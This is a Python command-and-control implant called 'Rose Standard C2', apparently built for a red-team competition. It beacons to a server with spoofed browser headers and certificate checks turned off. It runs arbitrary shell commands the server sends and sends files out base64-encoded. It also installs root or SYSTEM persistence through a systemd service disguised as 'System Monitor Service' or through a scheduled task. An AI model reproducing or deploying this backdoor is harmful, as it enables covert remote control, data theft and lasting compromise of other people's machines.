#Rose Standard C2
#!/usr/bin/env python3
import os, sys, json, base64, time, random, urllib, subprocess, platform, socket, hashlib, hmac, datetime, threading, sqlite3, uuid, re, ssl
from urllib.parse import urlencode

import platform, os, re, ctypes, getpass, socket, json, urllib, ssl, time

SERVER_URL="https://10.100.1.56:8000/"
AGENT_NAME="example1"
AGENT_TYPE="rose_c2"
AUTH_TOKEN="plaintext_really"

# Allow connection to the server (uses a self signed cert)
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

def print_debug(message):
    # Stub function for a more detailed logging functionally present in Andrew's main codebase that doesn't make sense to replicate here
    # For example, if you have a DEBUG flag set, then print to console/logfile.
    # Otherwise (full deploy for comp), suppress output.
    print(message)

def get_platform_dist():
    """
    Helper func that returns a string with the platform distribution.
    """
    sys_platform = platform.system()

    # --- Windows Handling ---
    if sys_platform == "Windows":
        release, version, csd, ptype = platform.win32_ver()
        return ("Windows", release, version)

    # --- Linux Handling ---
    if sys_platform == "Linux":
        # Try Python 3.10+ native method (Standardized os-release)
        if hasattr(platform, 'freedesktop_os_release'):
            try:
                info = platform.freedesktop_os_release()
                return (info.get('ID', 'linux'), info.get('VERSION_ID', ''), info.get('NAME', ''))
            except OSError:
                pass

        # 2. Manual parsing for older Python versions (< 3.10)
        if os.path.isfile("/etc/os-release"):
            info = {}
            with open("/etc/os-release") as f:
                for line in f:
                    # Parse KEY=VALUE, ignoring comments and empty lines
                    match = re.match(r'^([A-Z_]+)="?([^"\n]+)"?$', line)
                    if match:
                        info[match.group(1)] = match.group(2)
            return (
                info.get('ID', 'linux'), 
                info.get('VERSION_ID', info.get('VERSION', '')), 
                info.get('PRETTY_NAME', '')
            )

    # Fallback for MacOS or unknown systems
    return (sys_platform, platform.release(), platform.version())

def get_os(simple=False):
    """
    Gets the approximate OS used, optionally simplified to highest level possible.
    For example: Ubuntu, Debian, Rocky, RHEL, Windows Workstation (7 8 10 11), Windows Server (2012 2016 2022 2025)

    Args: simple(Bool)
    Returns: osType(String)
    """
    system = platform.system()

    if system == "Linux":
        if simple:
            return get_platform_dist()[1] # Ubuntu, debian, redhat
        return ' '.join(get_platform_dist()) # Ubuntu 10.04 lucid, debian 4.0 , fedora 17 Beefy Miracle, redhat 5.6 Tikanga, redhat 5.9 Final (<- centos)

    if simple:
        return platform.system() # Windows, FreeBSD
    return f"{platform.system()} {platform.release()}" #Windows 10, Windows 2016Server, FreeBSD XYZ

def get_perms():
    """
    Gets the execution perm level (user and elevation level).
    Returns: isRunAsElevated(bool), runAsUser(String)
    """
    system = platform.system()

    if system == "Windows":
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            is_admin = False
        # USERDOMAIN = Returns the NetBIOS domain name
        # Will be DOMAIN if a domain user, or hostname if local user
        domain = os.environ.get("USERDOMAIN")
        user = getpass.getuser()
        if domain:
            runAsUser = f"{domain}\\{user}"
        else:
            runAsUser = user
        return is_admin, runAsUser
    
    if system in ("Linux", "FreeBSD"):
        # euid 0 - root OR sudo
        is_root = (os.geteuid() == 0)

        # Detect sudo. May have unexpected results (False when it is actually using SUDO)
        # depending on OS and inconsistent usage of SUDO_USER variable across systems. 
        sudo_user = os.environ.get("SUDO_USER")
        if sudo_user:
            runAsUser = sudo_user
        else:
            # Normal user or directly root
            runAsUser = getpass.getuser()
        return is_root, runAsUser
    
    print_debug("get_perms(): reached unexpected unsupported OS block")
    return False, ""

def get_primary_ip():
    """
    Attempts to get the primary IP address of the local machine.
    Returns: ip(String) or "0.0.0.0" if failed
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Connect to an external host (e.g., Google's public DNS or test-net-3)
        # This doesn't send any data, just establishes a connection to find out which local interface would be used.
        s.connect(("8.8.8.8", 80)) # 203.0.113.2 # test-net-3 # Doesn't need to be reachable. Use non-routable address for stealth - except that might not work under certain conditions so do Google for reliability.
        ip_address = s.getsockname()[0]
    except Exception as E:
        ip_address = "0.0.0.0" # safe default
        print_debug(f"get_primary_ip() error: {E}")
    finally:
        s.close()
    return ip_address

def get_system_details():
    """
    Helper func that builds the overall system info dictionary
    Returns: sysInfo(dict)
    """
    sysInfo = {
        "os": get_os(),
        "executionUser": get_perms()[1],
        "executionAdmin": get_perms()[0],
        "hostname": socket.gethostname(), #alternate method if FQDN is desired: socket.getfqdn()
        "ipadd": get_primary_ip()
    }
    return sysInfo

def send_message(endpoint,message="",oldStatus=True,newStatus=True,systemInfo=get_system_details(),server_timeout=5):
    """
    Sends the specified data to the server.
    Handles the full process and attaching agent name/auth/system details.

    Args: endpoint(string,required),message(any),oldStatus/newStatus(bool)
    Returns: status(Bool)
    """
    global AUTH_TOKEN
    if not SERVER_URL:
        # Server comms are intentionally disabled (server_url is an empty string)
        # Maybe redirect to print_debug instead?
        return False, "no SERVER_URL value specified"

    try:
        url = SERVER_URL + endpoint

        # Prep payload
        # Note that not all of these are strictly needed for every endpoint. However, the server accepts extra data fields without complaint, 
        # they do not add appreciable data leakage or transmission size to the communication, and they greatly simplify the arguments and 
        # assembly logic of the payload, so we attach the same data to every communication.
        payload = {
            "name": AGENT_NAME,
            "hostname": systemInfo["hostname"],
            "ip": systemInfo["ipadd"],
            "os": systemInfo["os"],
            "executionUser": systemInfo["executionUser"],
            "executionAdmin": systemInfo["executionAdmin"],
            "auth": AUTH_TOKEN,
            "agent_type": AGENT_TYPE,
            "oldStatus": oldStatus,
            "newStatus": newStatus,
            "message": message
        }

        # Prepare data as JSON for transmit
        data = json.dumps(payload).encode("utf-8")

        # Build request
        req = urllib.request.Request(
            url,
            data=data,
            headers={"Content-Type": "application/json"},
            method="POST" # literally every endpoint is standardized on POST for agent comms as it's needed to send AUTH and other items
        )

        # Send payload
        with urllib.request.urlopen(req, timeout=server_timeout, context=CTX) as response:
            if response.getcode() == 200:
                # Good result! Now parse and return the endpoint
                print_debug(f"send_message({url}): sent msg to server: [{oldStatus,newStatus,message}]")
                response_text = response.read().decode('utf-8')
                # All beacon endpoints provide a new AUTH value that should be read in memory to replace the configured one
                # This updated AUTH value is needed for every agent endpoint beyond the basic beacon
                if "agent/beacon" in endpoint:
                    if response_text != AUTH_TOKEN:
                        AUTH_TOKEN = response_text
                        print_debug(f"send_message({url}): updating auth token value to new value from server {AUTH_TOKEN}")
                return True, response_text
            else:
                print_debug(f"send_message({url}): Server error: {response.getcode()}")

    # Error handling
    # Various requests errors - networking failure or 4xx/5xx code from server (out of scope for client-side error handling)
    except urllib.error.HTTPError as e:
        print_debug(f"[send_message({url}): HTTP error: {e.code} {e.reason}")
    except urllib.error.URLError as e:
        print_debug(f"send_message({url}): URL error: {e.reason}")
    except Exception as e:
        print_debug(f"send_message({url}): Beacon error: {e}")
    return False, ""


class AdaptiveC2Client:
    def __init__(self, c2_server, secret_key, sleep_time=60, jitter=20):
        self.c2_server = c2_server
        self.secret_key = secret_key
        self.sleep_time = sleep_time
        self.jitter = jitter

        # Generate unique host ID
        self.beacon_id = hashlib.md5(f"{platform.system()}-{socket.gethostname()}-{platform.machine()}".encode()).hexdigest()[:16]
        self.hostname = socket.gethostname()
        self.ip_address = self.get_local_ip()
        self.user = os.getenv('USER') or os.getenv('USERNAME')
        self.os_info = f"{platform.system()} {platform.release()}"
        self.running = True

        # Detect installed services for context
        self.environment_profile = self.detect_environment()
        # Randomized user agents for HTTP requests
        self.user_agents = [
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        ]
        print(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Using HTTPS for C2 communication")
    
    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except: return "127.0.0.1"
    
    def detect_environment(self):
        profile = {"hostname": self.hostname, "os": self.os_info, "services": []}
        services = [
            ("nginx", ["systemctl", "is-active", "nginx"]),
            ("grafana", ["systemctl", "is-active", "grafana-server"]),
            ("apache", ["systemctl", "is-active", "apache2"]),
            ("docker", ["systemctl", "is-active", "docker"])
        ]
        for service_name, cmd in services:
            try:
                result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                if result.returncode == 0:
                    profile["services"].append(service_name)
                    print(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Detected {service_name} service")
            except: pass
        return profile
    
    def create_signature(self, data):
        """Generate HMAC signature for request validation."""
        return hmac.new(self.secret_key.encode(), data, hashlib.sha256).hexdigest()
    
    def _make_request(self, endpoint, data, method="GET"):
        """Make HTTPS request with stealth techniques using only built-in modules"""
        headers = {
            "User-Agent": random.choice(self.user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "DNT": "1",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Pragma": "no-cache",
            "Cache-Control": "no-cache"
        }
        
        # Add service-specific headers if available
        if "nginx" in self.environment_profile["services"]:
            headers["X-Requested-With"] = "XMLHttpRequest"
        elif "grafana" in self.environment_profile["services"]:
            headers["X-Grafana-Org-Id"] = "1"
        
        # Prepare URL and data
        url = f"{self.c2_server}/{endpoint}"
        if method == "GET" and data:
            query_string = urlencode(data)
            url += f"?{query_string}"
        
        try:
            # Parse URL
            parsed_url = urllib.parse.urlparse(url)
            hostname = parsed_url.hostname
            port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
            path = parsed_url.path + ('?' + parsed_url.query if parsed_url.query else '')
            
            # Create SSL context
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            # Create socket connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if parsed_url.scheme == 'https':
                sock = context.wrap_socket(sock, server_hostname=hostname)
            
            sock.settimeout(10)
            sock.connect((hostname, port))
            
            # Prepare request
            if method == "GET":
                request = f"GET {path} HTTP/1.1\r\n"
            else:
                request = f"POST {path} HTTP/1.1\r\n"
            
            # Add headers
            request += f"Host: {hostname}\r\n"
            for header, value in headers.items():
                request += f"{header}: {value}\r\n"
            
            # Add content length for POST requests
            if method == "POST" and data:
                post_data = urlencode(data).encode()
                request += f"Content-Length: {len(post_data)}\r\n"
                request += f"Content-Type: application/x-www-form-urlencoded\r\n"
            
            request += "\r\n"
            
            # Send request
            if method == "POST" and data:
                sock.sendall(request.encode() + post_data)
            else:
                sock.sendall(request.encode())
            
            # Receive response
            response_data = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response_data += chunk
            
            sock.close()
            
            # Parse response
            response_text = response_data.decode('utf-8', errors='ignore')
            headers, body = response_text.split('\r\n\r\n', 1)
            
            # Extract status code
            status_line = headers.split('\r\n')[0]
            status_code = int(status_line.split(' ')[1])
            
            # Create a mock response object
            class MockResponse:
                def __init__(self, status_code, text):
                    self.status_code = status_code
                    self.text = text
                
                def json(self):
                    try:
                        return json.loads(self.text)
                    except:
                        return {}
            
            return MockResponse(status_code, body)
            
        except Exception as e:
            print(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Request failed: {e}")
            return None
    
    def run(self):
        print(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Starting C2 client with ID: {self.beacon_id}")
        self.checkin()

        status, response = send_message("agent/beacon","register")
        
        while self.running:
            try:
                commands = self.get_commands()
                if not commands:
                    status, response = send_message("agent/get_task")
                    if status: # Check that communication was successful
                        if response != "no pending tasks":
                            # We have a task waiting! Let's decode it (see API spec document):
                            data = json.loads(response)
                            task_id = data.get('task_id')
                            task_command = data.get('task')
                            commands = [{"id": f"central_{task_id}", "command": task_command}]
                if commands:
                    for command in commands:
                        command_id = command.get("id")
                        command_text = command.get("command")
                        print(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Executing command: {command_text}")
                        result = self.execute_command(command_text)
                        if command_id[:8]=="central_":
                            resultjson = json.dumps({"task_id": task_id[8:], "result": result}, separators=(',', ':')) # specify separators to compact whitespace
                            status, response = send_message("agent/set_task_result",message=resultjson)
                        else:
                            self.submit_result(command_id, result)
                
                sleep_time = self.sleep_time + random.randint(-self.jitter, self.jitter)
                time.sleep(sleep_time)
            except Exception as e:
                print(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Error in main loop: {e}")
                time.sleep(self.sleep_time)
    
    def checkin(self):
        """Check in with the C2 server"""
        checkin_data = {
            "id": self.beacon_id,
            "host": self.hostname,
            "ip": self.ip_address,
            "user": self.user,
            "os": self.os_info,
            "services": ",".join(self.environment_profile["services"]),
            "sig": self.create_signature(
                f"{self.beacon_id}{self.hostname}{self.ip_address}{self.user}{self.os_info}".encode()
            )
        }
        
        response = self._make_request("checkin", checkin_data)
        if response and response.status_code == 200:
            print(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Check-in successful")
            return True
        else:
            print(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Check-in failed")
            return False
    
    def get_commands(self):
        """Get pending commands from the C2 server"""
        command_data = {
            "id": self.beacon_id,
            "sig": self.create_signature(self.beacon_id.encode())
        }
        
        response = self._make_request("commands", command_data)
        if response and response.status_code == 200:
            try:
                return response.json()
            except:
                return []
        return []
    
    def submit_result(self, command_id, result):
        """Submit command execution result to the C2 server"""
        result_data = {
            "id": command_id,
            "result": base64.b64encode(result.encode()).decode(),
            "sig": self.create_signature(f"{command_id}{result}".encode())
        }
        
        response = self._make_request("result", result_data, method="POST")
        return response is not None and response.status_code == 200
    
    def execute_command(self, command):
        """Execute a command and return the output"""
        try:
            if command.startswith("c2_"):
                return self.handle_builtin_command(command)
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
            return result
        except subprocess.CalledProcessError as e:
            return f"Command failed with error: {e.output}"
        except Exception as e:
            return f"Error executing command: {str(e)}"
    
    def handle_builtin_command(self, command):
        """Handle built-in C2 commands"""
        parts = command.split()
        cmd_type = parts[0]
        
        if cmd_type == "c2_info":
            return json.dumps({
                "hostname": self.hostname,
                "ip_address": self.ip_address,
                "user": self.user,
                "os_info": self.os_info,
                "beacon_id": self.beacon_id,
                "environment": self.environment_profile
            }, indent=2)
        
        elif cmd_type == "c2_sleep" and len(parts) > 1:
            try:
                self.sleep_time = int(parts[1])
                return f"Sleep time updated to {self.sleep_time} seconds"
            except: return "Invalid sleep time value"
        
        elif cmd_type == "c2_jitter" and len(parts) > 1:
            try:
                self.jitter = int(parts[1])
                return f"Jitter updated to {self.jitter} seconds"
            except: return "Invalid jitter value"
        
        elif cmd_type == "c2_download" and len(parts) > 1:
            try:
                with open(parts[1], "rb") as f:
                    file_data = f.read()
                return json.dumps({
                    "path": parts[1], 
                    "size": len(file_data), 
                    "data": base64.b64encode(file_data).decode()
                })
            except Exception as e: 
                return f"Error downloading file: {str(e)}"
        
        elif cmd_type == "c2_upload" and len(parts) > 2:
            try:
                file_data = base64.b64decode(parts[1])
                with open(parts[2], "wb") as f:
                    f.write(file_data)
                return f"Successfully uploaded {len(file_data)} bytes to {parts[2]}"
            except Exception as e: 
                return f"Error uploading file: {str(e)}"
        
        elif cmd_type == "c2_persist":
            try:
                return self.install_persistence()
            except Exception as e:
                return f"Error installing persistence: {str(e)}"
        
        elif cmd_type == "c2_remove":
            try:
                return self.remove_persistence()
            except Exception as e:
                return f"Error removing persistence: {str(e)}"
        
        elif cmd_type == "c2_exit":
            self.running = False
            return "C2 client will exit after next check-in"
        
        else: 
            return f"Unknown built-in command: {cmd_type}"
    
    def install_persistence(self):
        """Install persistence mechanism"""
        try:
            if platform.system() == "Linux":
                # Create systemd service
                service_content = f"""[Unit]
Description=System Monitor Service
After=network.target

[Service]
ExecStart=/usr/bin/python3 -c "import os, subprocess, ssl, requests, json, base64, time, random, hashlib, hmac, platform, socket, datetime; exec(open('{os.path.abspath(__file__)}').read())"
WorkingDirectory={os.path.dirname(os.path.abspath(__file__))}
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target"""
                
                service_path = f"/etc/systemd/system/c2-{self.beacon_id}.service"
                with open(service_path, "w") as f:
                    f.write(service_content)
                
                subprocess.run(["systemctl", "daemon-reload"], check=True)
                subprocess.run(["systemctl", "enable", f"c2-{self.beacon_id}.service"], check=True)
                subprocess.run(["systemctl", "start", f"c2-{self.beacon_id}.service"], check=True)
                
                return f"Installed persistence via systemd service"
            
            elif platform.system() == "Windows":
                # Create scheduled task
                bat_content = f"""@echo off
cd /d "{os.path.dirname(os.path.abspath(__file__))}"
python "{os.path.abspath(__file__)}\""""
                
                bat_path = os.path.join(os.environ["TEMP"], f"c2_{self.beacon_id}.bat")
                with open(bat_path, "w") as f:
                    f.write(bat_content)
                
                subprocess.run([
                    "schtasks", "/create", "/tn", f"c2_{self.beacon_id}", 
                    "/tr", bat_path, "/sc", "onlogon", "/ru", "SYSTEM", "/f"
                ], check=True)
                
                return f"Installed persistence via scheduled task"
            
            return "Unsupported platform for persistence"
        
        except Exception as e:
            return f"Error installing persistence: {str(e)}"
    
    def remove_persistence(self):
        """Remove persistence mechanism"""
        try:
            if platform.system() == "Linux":
                # Stop and disable the service
                subprocess.run(["systemctl", "stop", f"c2-{self.beacon_id}.service"], check=False)
                subprocess.run(["systemctl", "disable", f"c2-{self.beacon_id}.service"], check=False)
                
                # Remove service file
                service_path = f"/etc/systemd/system/c2-{self.beacon_id}.service"
                if os.path.exists(service_path):
                    os.remove(service_path)
                    subprocess.run(["systemctl", "daemon-reload"], check=True)
                
                return f"Removed persistence via systemd service"
            
            elif platform.system() == "Windows":
                # Remove scheduled task
                subprocess.run([
                    "schtasks", "/delete", "/tn", f"c2_{self.beacon_id}", "/f"
                ], check=False)
                
                # Remove batch file
                bat_path = os.path.join(os.environ["TEMP"], f"c2_{self.beacon_id}.bat")
                if os.path.exists(bat_path):
                    os.remove(bat_path)
                
                return f"Removed persistence via scheduled task"
            
            return "Unsupported platform for persistence removal"
        
        except Exception as e:
            return f"Error removing persistence: {str(e)}"


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python c2_client.py <c2_server> <secret_key>")
        sys.exit(1)
    
    c2_server = sys.argv[1]
    secret_key = sys.argv[2]
    
    client = AdaptiveC2Client(c2_server, secret_key)
    client.run()